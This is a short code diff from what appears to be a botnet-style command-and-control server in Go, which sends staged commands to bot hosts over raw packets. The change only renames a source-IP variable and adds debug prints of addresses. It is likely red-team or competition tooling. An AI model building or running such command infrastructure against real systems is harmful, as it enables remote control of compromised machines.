@@ -33,7 +33,7 @@ type PwnBoard struct {
 }
 
 // sendCommand takes
-func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, listen chan Host) {
+func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {
 
 	// Forever loop to respond to bots
 	for {
@@ -44,7 +44,11 @@ func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, list
 			// Make a socket for sending
 			fd := cattails.NewSocket()
 			// Create packet
-			packet := cattails.CreatePacket(iface, src, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
+			fmt.Println("SRC MAC:", iface.HardwareAddr)
+			fmt.Println("DST MAC:", dstMAC)
+			fmt.Println("SRC IP:", myIP)
+			fmt.Println("DST IP:", bot.IP)
+			packet := cattails.CreatePacket(iface, myIP, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
 			// YEET
 			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 
@@ -133,8 +137,8 @@ func main() {
 	// Make channel buffer by 5
 	listen := make(chan Host, 5)
 
-	// Iface and src ip for the sendcommand func to use
-	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
+	// Iface and myip for the sendcommand func to use
+	iface, myIP := cattails.GetOutwardIface("8.8.8.8:80")
 	fmt.Println("[+] Interface:", iface.Name)
 
 	dstMAC, err := cattails.GetRouterMAC()
@@ -145,7 +149,7 @@ func main() {
 
 	// Spawn routine to listen for responses
 	fmt.Println("[+] Starting go routine...")
-	go sendCommand(iface, src, dstMAC, listen)
+	go sendCommand(iface, myIP, dstMAC, listen)
 
 	// Start CLI
 	go cli()
